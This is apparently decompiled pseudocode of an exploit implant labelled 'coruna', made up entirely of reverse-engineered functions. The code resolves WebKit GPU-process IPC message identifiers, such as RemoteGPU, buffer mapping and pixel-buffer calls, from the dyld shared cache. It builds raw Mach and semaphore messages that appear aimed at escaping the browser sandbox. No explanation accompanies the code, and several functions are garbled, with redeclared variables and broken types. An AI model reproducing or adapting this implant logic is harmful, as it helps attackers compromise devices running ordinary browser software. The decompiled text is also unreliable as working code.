    bootargs = (void *)((long)bootargs - ls4);
    if (0 < (long)ls4) {
      _memcpy(bootargs,scratch,ls4);
      scratch = (void *)*handle;
      handle = handle[1];
    }
    *handle = (long)bootargs;
    handle[1] = (long)thread_attr;
    addr = handle[2];
    handle[2] = host_info;
    thread_attr = (uint64_t *)handle;
    if (handle - (long)scratch != 0) {
      thread_attr = (uint64_t *)
                 (handle + (((handle - (long)scratch) - 0x78U) / 0x78 ^ 0xffffffffffffffff) * 0x78);
    }
    if (scratch != (void *)0x0) {
      bootargs = scratch;
      host_info = addr;
      operator_delete(scratch);
    }
  }
  return;
}
void coruna_sleep(long handle,long addr_2)
{
  long *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  
  ctx_val = *(long *)(handle + 0x2f0);
  handle = *(long *)(handle + 0x2f8);
  serial = *(long *)(handle + 0x2c0);
  addr = *(long *)(handle + 0x2c8);
  ptr = operator_new(0x30);
  base = 0;
  off = 0;
  *ptr = handle + 0x40;
  ptr[1] = 0x280;
  ptr[2] = ctx_val;
  ptr[3] = handle - ctx_val;
  ptr[4] = serial;
  ptr[5] = addr - serial;
  do {
    addr = *(long *)((long)ptr + base);
    ctx_val = ((long *)((long)ptr + base))[1];
    handle = ctx_val + addr;
    if ((addr <= addr_2 && handle != addr_2) && (addr_2 < addr || addr_2 <= handle)) {
      if (((off + addr_2) - addr) + *(long *)(handle + 0x310) != 0) {
        operator_delete(ptr);
        return;
      }
      break;
    }
    off = ctx_val + off;
    base = base + 0x10;
  } while (base != 0x30);
  do {
    _sleep(1);
  } while( true );
}





void coruna_abort_aa28(void)
{
  _abort();
}
void coruna_implant6dec_via_abort_aa28_3(uint64_t *val,unsigned long arg)
{
  void *ptr;
  
  if (-1 < (long)arg) {
    ptr = operator_new(arg);
    *val = ptr;
    val[1] = ptr;
    val[2] = (long)ptr + arg;
    return;
  }
  coruna_abort_aa28();
}
void coruna_memcpy_aa94(uint64_t *val,long *handle)
{
  void *ptr;
  size_t ls2;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  if (handle[1] - *handle != 0) {
    coruna_implant6dec_via_abort_aa28_3(val,handle[1] - *handle);
    ptr = (void *)val[1];
    ls2 = handle[1] - *handle;
    if (0 < (long)ls2) {
      _memcpy(ptr,(void *)*handle,ls2);
      ptr = (void *)((long)ptr + ls2);
    }
    val[1] = ptr;
  }
  return;
}





void coruna_abort_ab28(void)
{
  _abort();
}
void coruna_implant6dec_via_cat_5(long *handle,uint *size)
{
  uint u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long *ptr;
  unsigned long type_id;
  uint16_t type_id_8;
  uint64_t type_id_9;
  
  version = handle[1];
  if (version != 0) {
    u = *size;
    port = (unsigned long)u;
    type_id_9 = coruna_cat(POPCOUNT((char)(version >> 0x38)),
                      coruna_cat(POPCOUNT((char)(version >> 0x30)),
                               coruna_cat(POPCOUNT((char)(version >> 0x28)),
                                        coruna_u64_pack14((POPCOUNT((char)(version >> 0x20))), (coruna_cat(POPCOUNT((char))(version >> 0x18)),
                                                          coruna_cat(POPCOUNT((char)(version >> 0x10)),
                                                                   coruna_cat(POPCOUNT((char)(version >>
                                                                                           8)),
                                                                            POPCOUNT((char)version))))
                                                ))));
    type_id_8 = NEON_uaddlv(type_id_9,1);
    tag = coruna_cat((int6)((unsigned long)type_id_9 >> 0x10),type_id_8) & 0xffffffff;
    if (tag < 2) {
      kind = (unsigned long)((int)version - 1U & u);
    }
    else {
      kind = port;
      if (version <= port) {
        kind = 0;
        if (version != 0) {
          kind = port / version;
        }
        kind = port - kind * version;
      }
    }
    ptr = *(long **)(*handle + kind * 8);
    if (ptr != (long *)0x0) {
      ptr = (long *)*ptr;
      if (ptr != (long *)0x0) {
        do {
          type_id = ptr[1];
          if (type_id == port) {
            if (*(uint *)(ptr + 2) == u) {
              return;
            }
          }
          else {
            if (tag < 2) {
              type_id = type_id & version - 1;
            }
            else if (version <= type_id) {
              size = 0;
              if (version != 0) {
                size = type_id / version;
              }
              type_id = type_id - size * version;
            }
            if (type_id != kind) {
              return;
            }
          }
          ptr = (long *)*ptr;
        } while (ptr != (long *)0x0);
      }
      return;
    }
  }
  return;
}
void coruna_implant6dec_residual_84(uint64_t *val,uint64_t *id_2,uint8_t *buf)
{
  void *ptr;
  size_t ls2;
  uint8_t *ptr;
  uint64_t u;
  uint8_t *buf;
  long handle;
  uint8_t *str;
  
  handle = id_2[1];
  ptr = (void *)*val;
  ls2 = (long)buf - (long)ptr;
  id_2[1] = (void *)(handle - ls2);
  if (0 < (long)ls2) {
    _memcpy((void *)(handle - ls2),ptr,ls2);
  }
  ptr = (uint8_t *)val[1];
  if (ptr != buf) {
    buf = (uint8_t *)id_2[2];
    do {
      str = buf + 1;
      *buf = *buf;
      buf = (uint8_t *)(id_2[2] + 1);
      id_2[2] = buf;
      buf = str;
    } while (str != ptr);
  }
  u = *val;
  *val = id_2[1];
  id_2[1] = u;
  u = val[1];
  val[1] = id_2[2];
  id_2[2] = u;
  u = val[2];
  val[2] = id_2[3];
  id_2[3] = u;
  *id_2 = id_2[1];
  return;
}
void coruna_implant6dec_via_abort_2(uint64_t *val,unsigned long arg,long handle,uint64_t id_2)
{
  void *ptr;
  void *buf;
  
  val[3] = 0;
  val[4] = id_2;
  if (arg == 0) {
    ptr = (void *)0x0;
  }
  else {
    if (0x222222222222222 < arg) {
      coruna_abort();
    }
    ptr = operator_new(arg * 0x78);
  }
  buf = (void *)((long)ptr + handle * 0x78);
  *val = ptr;
  val[1] = buf;
  val[2] = buf;
  val[3] = (void *)((long)ptr + arg * 0x78);
  return;
}





void coruna_abort_ada4(void)
{
  _abort();
}
void coruna_implant6dec_via_implant6dec_via_cat_2_3(long *handle,long *addr_2,int flags)
{
  uint64_t *ptr;
  uint64_t *buf;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  uint32_t scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  
  if (flags != 0) {
    bootargs = 4;
    handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&bootargs);
    u = *(uint64_t *)(handle + 0x18);
    scratch = 0x13;
    handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
    size = *(uint64_t *)(handle + 0x18);
    thread_attr = 0x12;
    handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&thread_attr);
    coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),size,u);
  }
  buf = (uint64_t *)addr_2[1];
  for (ptr = (uint64_t *)*addr_2; ptr != buf; ptr = ptr + 2) {
    u = coruna_sleep(handle,*ptr);
    handle = coruna_sleep(handle,ptr[1]);
    thread_attr = 0x1f;
    addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&thread_attr);
    coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(addr + 0x18),handle + -0x10,u);
  }
  return;
}
void coruna_implant6dec_via_implant6dec_via_cat_2_4(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1e;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  coruna_implant6dec_via_sleep(handle,*(uint64_t *)(handle + 0x18),size_3);
  coruna_implant6dec_via_sleep(handle,val,id_2);
  return;
}
void coruna_implant6dec_via_implant6dec_via_cat_2_5(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1e;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  coruna_implant6dec_via_sleep(handle,*(uint64_t *)(handle + 0x18),off_4);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,val,id_2,size_3);
  return;
}
void coruna_implant6dec_via_implant6dec_via_cat_2_6(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4,uint64_t off_5)
{
  long handle;
  uint64_t *ptr;
  uint32_t scratch;
  
  scratch = 0x22;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  handle = *(long *)(handle + 0x18);
  ptr = (uint64_t *)coruna_implant6dec_residual_85(handle);
  if (ptr != (uint64_t *)0x0) {
    *ptr = 0;
    ptr[1] = handle + -0x50;
  }
  coruna_implant6dec_via_implant6dec_via_implant6dec_via_cat_2_5(handle,val,id_2,size_3,off_4,off_5);
  return;
}
void coruna_implant6dec_via_implant6dec_via_cat_2_7(long *handle,long addr_2)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1d;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  coruna_implant6dec_via_implant6dec_via_cat_2_4(handle,*(uint64_t *)(handle + 0x18),0,addr_2 + -0x1d);
  return;
}
void coruna_implant6dec_via_implant6dec_via_implant6dec_via_cat_2_5(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4,uint64_t off_5)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1e;
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  coruna_implant6dec_via_sleep(handle,*(uint64_t *)(handle + 0x18),off_5);
  coruna_implant6dec_via_implant6dec_via_cat_2_5(handle,val,id_2,size_3,off_4);
  return;
}
void coruna_implant6dec_via_abort_b268(uint64_t *val,unsigned long arg)
{
  void *ptr;
  
  if (arg >> 0x3c == 0) {
    ptr = operator_new(arg << 4);
    *val = ptr;
    val[1] = ptr;
    val[2] = (void *)((long)ptr + arg * 0x10);
    return;
  }
  coruna_abort_b268();
}





void coruna_abort_b268(void)
{
  _abort();
}
void coruna_memcpy_b274(uint64_t *val,long *handle)
{
  void *ptr;
  size_t ls2;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  if (handle[1] - *handle != 0) {
    coruna_implant6dec_via_abort_b268(val,handle[1] - *handle >> 4);
    ptr = (void *)val[1];
    ls2 = handle[1] - *handle;
    if (0 < (long)ls2) {
      _memcpy(ptr,(void *)*handle,ls2);
      ptr = (void *)((long)ptr + ls2);
    }
    val[1] = ptr;
  }
  return;
}
void coruna_implant6dec_via_sleep(long handle,long addr_2,long off_3)
{
  long *ptr;
  uint64_t u;
  long handle;
  long addr;
  uint64_t *ptr;
  
  ptr = (long *)coruna_implant6dec_residual_85();
  if (ptr != (long *)0x0) {
    ptr[1] = addr_2 + -0x50;
    if (off_3 == 0xfffffda063101) {
      for (handle = *(long *)(handle + 0x2c0); handle != *(long *)(handle + 0x2c8);
          handle = handle + 0x78) {
        addr = 0x10;
        do {
          if (*(long *)(handle + addr) == 0xffff101360adf) {
            ptr = (uint64_t *)(handle + addr);
            goto fail;
          }
          addr = addr + 0x10;
        } while (addr != 0x60);
      }
      ptr = (uint64_t *)0x0;
fail:
      u = coruna_sleep(handle,ptr);
      *ptr = u;
      *ptr = 0;
    }
    else {
      *ptr = off_3;
    }
  }
  return;
}
void coruna_implant6dec_residual_85(long handle)
{
  long handle;
  long addr;
  
  handle = 0;
  addr = *(long *)(handle + 0x308);
  do {
    if (*(long *)(addr + 0x18) == 0) {
      if ((uint)-(int)handle < 5) {
        return;
      }
      break;
    }
    handle = handle + -1;
    addr = addr + 0x10;
  } while (handle != -5);
  coruna_implant6dec_via_u64_pack(handle,1);
  handle = 0;
  addr = *(long *)(handle + 0x308);
  do {
    if (*(long *)(addr + 0x18) == 0) {
      return;
    }
    handle = handle + -1;
    addr = addr + 0x10;
  } while (handle != -5);
  return;
}
void coruna_implant6dec_via_u64_pack(long *handle,int flags)
{
  long handle;
  uint64_t u;
  long addr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  long block_ctx;
  
  block_ctx = *(long *)k_implant_stack_chk_guard_slot;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  bootargs = 0;
  bootargs = 0;
  host_info = 0;
  thread_attr = 0;
  serial_buf = 0;
  thread_attr = 0;
  block_ctx = 0;
  action = 0;
  stack_guard = 0;
  host_info = 0;
  action = 0;
  sa_saved = 0;
  serial_buf = 0xffffffffffffffff;
  coruna_implant6dec_via_abort_ada4(handle + 0x58,&scratch);
  addr = handle[0x61];
  handle[0x61] = handle[0x59] + -0x78;
  if (flags != 0) {
    scratch = coruna_u64_pack((scratch), (0x17));
    handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
    *(long *)(addr + 0x70) = *(long *)(handle + 0x18) + -0x50;
    u = coruna_sleep(handle,handle[0x61]);
    *(uint64_t *)(addr + 0x68) = u;
  }
  if (*(long *)k_implant_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_implant6dec_via_abort_b268_2(uint64_t *val,uint64_t *id_2,uint64_t *size_3)
{
  uint64_t *ptr;
  uint64_t u;
  uint64_t *buf;
  long handle;
  unsigned long size;
  size_t ls6;
  unsigned long version;
  void *ptr;
  
  ls6 = (long)size_3 - (long)id_2;
  version = (long)ls6 >> 4;
  handle = val[2];
  buf = (uint64_t *)*val;
  if ((unsigned long)(handle - (long)buf >> 4) < version) {
    if (buf != (uint64_t *)0x0) {
      val[1] = buf;
      operator_delete(buf);
      handle = 0;
      *val = 0;
      val[1] = 0;
      val[2] = 0;
    }
    if ((long)ls6 < 0) {
      coruna_abort_b268();
    }
    if (version <= (unsigned long)(handle >> 3)) {
      version = handle >> 3;
    }
    if (0x7fffffffffffffe < (unsigned long)(handle >> 4)) {
      version = 0xfffffffffffffff;
    }
    coruna_implant6dec_via_abort_b268(val,version);
    ptr = (void *)val[1];
    if (ls6 != 0) {
      _memcpy(ptr,id_2,ls6);
      ptr = (void *)((long)ptr + ls6);
    }
    val[1] = ptr;
  }
  else {
    ptr = (void *)val[1];
    size = (long)ptr - (long)buf >> 4;
    ptr = (uint64_t *)((long)id_2 + ((long)ptr - (long)buf));
    if (version <= size) {
      ptr = size_3;
    }
    for (; ptr != id_2; id_2 = id_2 + 2) {
      u = id_2[1];
      *buf = *id_2;
      buf[1] = u;
      buf = buf + 2;
    }
    if (size < version) {
      ls6 = (long)size_3 - (long)ptr;
      if (0 < (long)ls6) {
        _memcpy(ptr,ptr,ls6);
        ptr = (void *)((long)ptr + ls6);
      }
      val[1] = ptr;
    }
    else {
      val[1] = buf;
    }
  }
  return;
}
void coruna_implant6dec_via_implant6dec_via_abort_aa28(long handle,long *addr_2)
{
  unsigned long u;
  uint8_t *ptr;
  long *ptr;
  void *buf;
  long handle;
  long addr;
  unsigned long size;
  unsigned long version;
  long off;
  void *str;
  unsigned long port;
  long base;
  long ctx_val;
  uint8_t *buf;
  
  base = *(long *)(handle + 0x2f0);
  handle = *(long *)(handle + 0x2f8);
  ctx_val = *(long *)(handle + 0x2c0);
  addr = *(long *)(handle + 0x2c8);
  ptr = operator_new(0x30);
  off = 0;
  *ptr = handle + 0x40;
  ptr[1] = 0x280;
  ptr[2] = base;
  ptr[3] = handle - base;
  ptr[4] = ctx_val;
  ptr[5] = addr - ctx_val;
  do {
    handle = *(long *)((long)ptr + off);
    coruna_implant6dec_via_abort_aa28(addr_2,addr_2[1],handle,handle + ((long *)((long)ptr + off))[1]);
    off = off + 0x10;
  } while (off != 0x30);
  str = (void *)*addr_2;
  port = addr_2[1] - (long)str;
  ptr = (uint8_t *)addr_2[1];
  do {
    if ((port & 7) == 0) {
      operator_delete(ptr);
      return;
    }
    if (ptr < (uint8_t *)addr_2[2]) {
      buf = ptr + 1;
      *ptr = 0;
      addr_2[1] = (long)buf;
    }
    else {
      u = port + 1;
      if ((long)u < 0) {
        coruna_abort_aa28();
      }
      size = addr_2[2] - (long)str;
      version = size * 2;
      if (u <= version) {
        u = version;
      }
      if (0x3ffffffffffffffe < size) {
        u = 0x7fffffffffffffff;
      }
      if (u == 0) {
        buf = (void *)0x0;
      }
      else {
        buf = operator_new(u);
      }
      buf = (uint8_t *)((long)buf + port) + 1;
      *(uint8_t *)((long)buf + port) = 0;
      if (0 < (long)port) {
        _memcpy(buf,str,port);
      }
      *addr_2 = (long)buf;
      addr_2[1] = (long)buf;
      addr_2[2] = (long)buf + u;
      if (str != (void *)0x0) {
        operator_delete(str);
        buf = (uint8_t *)addr_2[1];
      }
    }
    str = (void *)*addr_2;
    port = (long)buf - (long)str;
    ptr = buf;
  } while( true );
}
void coruna_implant6dec_via_dlclose(long handle)
{
  void *ptr;
  
  coruna_dlclose(handle + 800);
  ptr = *(void **)(handle + 0x2f0);
  if (ptr != (void *)0x0) {
    *(void **)(handle + 0x2f8) = ptr;
    operator_delete(ptr);
  }
  if (*(char *)(handle + 0x2ef) < '\0') {
    operator_delete(*(void **)(handle + 0x2d8));
  }
  ptr = *(void **)(handle + 0x2c0);
  if (ptr != (void *)0x0) {
    *(void **)(handle + 0x2c8) = ptr;
    operator_delete(ptr);
  }
  return;
}
void coruna_dlclose(uint64_t *val)
{
  void *ptr;
  void *buf;
  void *str;
  
  ptr = (void *)*val;
  if (ptr != (void *)0x0) {
    str = ptr;
    buf = (void *)val[1];
    if ((void *)val[1] != ptr) {
      do {
        str = (void *)((long)buf + -0x10);
        if (*(long *)((long)buf + -8) != 0) {
          _dlclose();
          *(uint64_t *)((long)buf + -8) = 0;
        }
        buf = str;
      } while (str != ptr);
      str = (void *)*val;
    }
    val[1] = ptr;
    operator_delete(str);
  }
  return;
}
void coruna_implant6dec_residual_86(uint64_t *val)
{
  void *ptr;
  
  coruna_implant6dec_residual_87(val,val[2]);
  ptr = (void *)*val;
  *val = 0;
  if (ptr != (void *)0x0) {
    operator_delete(ptr);
  }
  return;
}
void coruna_implant6dec_residual_87(uint64_t val,uint64_t *id_2)
{
  void *ptr;
  void *buf;
  
  while (id_2 != (void *)0x0) {
    buf = (void *)*id_2;
    ptr = (void *)id_2[3];
    if (ptr != (void *)0x0) {
      id_2[4] = ptr;
      operator_delete(ptr);
    }
    operator_delete(id_2);
    id_2 = buf;
  }
  return;
}
void coruna_implant6dec_residual_88(uint64_t *val)
{
  uint64_t *ptr;
  void *ptr;
  
  ptr = (void *)val[2];
  while (ptr != (void *)0x0) {
    ptr = (void *)*ptr;
    operator_delete(ptr);
    ptr = ptr;
  }
  ptr = (void *)*val;
  *val = 0;
  if (ptr != (void *)0x0) {
    operator_delete(ptr);
  }
  return;
}
void coruna_memcpy_ba98(uint64_t *val,long *handle)
{
  void *ptr;
  size_t ls2;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  if (handle[1] - *handle != 0) {
    coruna_implant6dec_via_abort_bb94(val,handle[1] - *handle >> 5);
    ptr = (void *)val[1];
    ls2 = handle[1] - *handle;
    if (0 < (long)ls2) {
      _memcpy(ptr,(void *)*handle,ls2);
      ptr = (void *)((long)ptr + ls2);
    }
    val[1] = ptr;
  }
  return;
}
void coruna_implant6dec_via_abort_bb94(uint64_t *val,unsigned long arg)
{
  void *ptr;
  
  if (arg >> 0x3b == 0) {
    ptr = operator_new(arg << 5);
    *val = ptr;
    val[1] = ptr;
    val[2] = (void *)((long)ptr + arg * 0x20);
    return;
  }
  coruna_abort_bb94();
}





void coruna_abort_bb94(void)
{
  _abort();
}
void coruna_implant6dec_residual_89(uint64_t *val,uint64_t *id_2,uint32_t *size)
{
  void *ptr;
  size_t ls2;
  uint32_t *ptr;
  uint64_t u;
  uint32_t *buf;
  uint32_t *str;
  long handle;
  uint32_t *copy;
  
  handle = id_2[1];
  ptr = (void *)*val;
  ls2 = (long)size - (long)ptr;
  id_2[1] = (void *)(handle - ls2);
  if (0 < (long)ls2) {
    _memcpy((void *)(handle - ls2),ptr,ls2);
  }
  ptr = (uint32_t *)val[1];
  if (ptr != size) {
    buf = (uint32_t *)id_2[2];
    do {
      copy = size + 1;
      str = buf + 1;
      *buf = *size;
      buf = str;
      size = copy;
    } while (copy != ptr);
    id_2[2] = str;
  }
  u = *val;
  *val = id_2[1];
  id_2[1] = u;
  u = val[1];
  val[1] = id_2[2];
  id_2[2] = u;
  u = val[2];
  val[2] = id_2[3];
  id_2[3] = u;
  *id_2 = id_2[1];
  return;
}
void coruna_implant6dec_via_u64_pack_2(uint32_t *size)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  host_info = 0;
  thread_attr = 0;
  ptr = _malloc(0x1000);
  *ptr = 1;
  ptr[1] = *(uint16_t *)((long)size + 0x126);
  *(uint32_t *)(ptr + 2) = 0;
  u = *(uint64_t *)(size + 0x12);
  *(uint64_t *)(ptr + 4) = 0;
  *(uint64_t *)(ptr + 8) = u;
  u = *(uint64_t *)(size + 0x30);
  *(uint64_t *)(ptr + 0xc) = *(uint64_t *)(size + 0xc);
  *(uint64_t *)(ptr + 0x10) = u;
  *(uint64_t *)(ptr + 0x14) = u;
  scratch[0] = 2;
  bootargs = *size;
  thread_attr = coruna_u64_pack((0x130000), ((uint32_t))thread_attr);
  host_info = coruna_u64_pack((host_info), (size[0x34]));
  serial_buf = 0x110000;
  coruna_vm_deallocate(ptr,ptr,0x30,scratch,&bootargs,size[1]);
  _free(ptr);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_semaphore_timedwait(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint32_t size,
                 uint8_t buf,uint32_t flags_2,uint32_t version_3,uint64_t val)
{
  unsigned long u;
  uint64_t size;
  kern_return_t lk3;
  unsigned long *ptr;
  uint32_t scratch[2];
  uint32_t bootargs[2];
  uint32_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x136);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  ptr[4] = val;
  *(uint8_t *)(ptr + 5) = 0;
  *(uint8_t *)((long)ptr + 0x29) = buf;
  *(uint8_t *)((long)ptr + 0x2a) = 0;
  *(uint32_t *)((long)ptr + 0x2c) = 0;
  ptr[6] = 0x11;
  *(uint8_t *)(ptr + 9) = 0x42;
  size = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  ptr[8] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  ptr[7] = size;
  *(uint32_t *)((long)ptr + 0x49) = flags_2;
  *(uint32_t *)((long)ptr + 0x4d) = version_3;
  *(uint8_t *)((long)ptr + 0x51) = (uint8_t)val;
  *(long *)((long)ptr + 0x55) = (long)val._4_4_;
  scratch[0] = 1;
  thread_attr = 0x130000;
  bootargs[0] = size;
  coruna_vm_deallocate(ptr,ptr,0x59,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  ptr[3] = 0;
  ptr[2] = 0;
  ptr[5] = 0;
  ptr[4] = 0;
  ptr[7] = 0;
  ptr[6] = 0;
  ptr[9] = 0;
  ptr[8] = 0;
  *(uint64_t *)((long)ptr + 0x51) = 0;
  *(uint64_t *)((long)ptr + 0x49) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  ptr[1] = 0;
  coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 0x10,ptr,0x10,1,handle,
               *(uint64_t *)(handle + 0xf8));
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk3 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x10;
    _free(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_semaphore_timedwait_bf38(long handle,unsigned long arg,unsigned long arg,uint8_t buf,uint32_t size,
                 uint32_t flags_2,void *ctx,size_t len,uint64_t val,
                 uint64_t id_2,uint64_t size_3,byte arg_x)
{
  uint32_t *ptr;
  semaphore_t semaphore;
  uint64_t u;
  kern_return_t lk3;
  unsigned long *buf;
  unsigned long *str;
  long handle;
  long addr;
  uint64_t *copy;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(len + 0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x138);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = arg;
  buf[2] = arg;
  *(uint8_t *)(buf + 3) = 0;
  *(uint8_t *)((long)buf + 0x19) = buf;
  *(uint8_t *)((long)buf + 0x1a) = 0;
  *(uint32_t *)((long)buf + 0x1c) = 0;
  buf[4] = 0x11;
  *(uint8_t *)(buf + 7) = 0x42;
  u = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  buf[6] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  buf[5] = u;
  *(uint32_t *)((long)buf + 0x3c) = size;
  *(uint32_t *)(buf + 8) = flags_2;
  buf[9] = len;
  if (len == 0) {
    handle = 0x50;
    str = buf;
  }
  else {
    str = _memcpy(buf + 10,ctx,len);
    handle = len + 0x50;
  }
  ptr = (uint32_t *)((long)buf + handle);
  *ptr = (uint32_t)val;
  ptr[1] = val._4_4_;
  ptr[2] = (uint32_t)id_2;
  ptr[3] = id_2._4_4_;
  ptr[4] = (uint32_t)size_3;
  ptr[5] = size_3._4_4_;
  *(ushort *)(ptr + 6) = (ushort)arg_x;
  scratch[0] = 0;
  coruna_vm_deallocate(str,buf,handle + 0x1aU,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  _bzero(buf,handle + 0x1aU);
  *buf = (unsigned long)*(ushort *)(handle + 0x122);
  buf[1] = 0;
  addr = *(long *)(handle + 0x20);
  copy = *(uint64_t **)(handle + 0xf8);
  handle = 0x18;
  if (*(uint64_t **)(handle + 200) != copy) {
    handle = 0x10;
  }
  semaphore = *(semaphore_t *)(handle + handle);
  *copy = 0x80000000;
  *(long *)((long)copy + (unsigned long)*(uint *)(handle + 0x14c)) = addr + 0x10;
  size = *buf;
  str = (unsigned long *)((long)copy + addr + (unsigned long)*(uint *)(handle + 0x150));
  str[1] = buf[1];
  *str = size;
  lk3 = _semaphore_signal(semaphore);
  if (lk3 == 0) {
    *buf = 0;
    buf[1] = 0;
  }
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk3 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x10;
    _free(buf);
  }
  return;
}
void coruna_implant6dec_str_system_library_frameworks_webkit_framework_webk(long handle)
{
  uint16_t u;
  int err;
  uint64_t *ptr;
  uint64_t size;
  
  ptr = (uint64_t *)
           coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                        "__ZN3IPC6Detail19messageDescriptionsE");
  size = *ptr;
  err = coruna_implant6dec_str_invalid_message_name(size,"Terminate");
  *(short *)(handle + 0x140) = (short)err;
  if (err != 0xffff) {
    err = coruna_implant6dec_str_invalid_message_name(size,"SetStreamDestinationID");
    *(short *)(handle + 0x120) = (short)err;
    if (err != 0xffff) {
      err = coruna_implant6dec_str_invalid_message_name(size,"ProcessOutOfStreamMessage");
      *(short *)(handle + 0x122) = (short)err;
      if (err != 0xffff) {
        err = coruna_implant6dec_str_invalid_message_name(size,"GPUConnectionToWebProcess_CreateRenderingBackend");
        *(short *)(handle + 0x124) = (short)err;
        if (err != 0xffff) {
          err = coruna_implant6dec_str_invalid_message_name(size,"GPUConnectionToWebProcess_CreateRemoteGPU");
          *(short *)(handle + 0x126) = (short)err;
          if (err != 0xffff) {
            err = coruna_implant6dec_str_invalid_message_name(size,"RemoteGPU_RequestAdapter");
            *(short *)(handle + 0x128) = (short)err;
            if (err != 0xffff) {
              err = coruna_implant6dec_str_invalid_message_name(size,"RemoteAdapter_RequestDevice");
              *(short *)(handle + 0x12a) = (short)err;
              if (err != 0xffff) {
                err = coruna_implant6dec_str_invalid_message_name(size,"RemoteDevice_CreateBuffer");
                *(short *)(handle + 300) = (short)err;
                if (err != 0xffff) {
                  err = coruna_implant6dec_str_invalid_message_name(size,"RemoteBuffer_MapAsync");
                  *(short *)(handle + 0x12e) = (short)err;
                  if (err != 0xffff) {
                    err = coruna_implant6dec_str_invalid_message_name(size,"RemoteBuffer_Unmap");
                    *(short *)(handle + 0x130) = (short)err;
                    if (err != 0xffff) {
                      err = coruna_implant6dec_str_invalid_message_name(size,"RemoteRenderingBackend_CreateImageBuffer");
                      *(short *)(handle + 0x132) = (short)err;
                      if (err != 0xffff) {
                        err = coruna_implant6dec_str_invalid_message_name(size,
                                             "RemoteRenderingBackend_GetPixelBufferForImageBuffer");
                        *(short *)(handle + 0x134) = (short)err;
                        if (err != 0xffff) {
                          err = coruna_implant6dec_str_invalid_message_name(size,
                                               "RemoteRenderingBackend_GetPixelBufferForImageBufferWithNewMemory"
                                              );
                          *(short *)(handle + 0x136) = (short)err;
                          if (err != 0xffff) {
                            err = coruna_implant6dec_str_invalid_message_name(size,
                                                 "RemoteRenderingBackend_PutPixelBufferForImageBuffer"
                                                );
                            *(short *)(handle + 0x138) = (short)err;
                            if (err != 0xffff) {
                              err = coruna_implant6dec_str_invalid_message_name(size,"RemoteDevice_CreateBindGroupLayout");
                              *(short *)(handle + 0x13c) = (short)err;
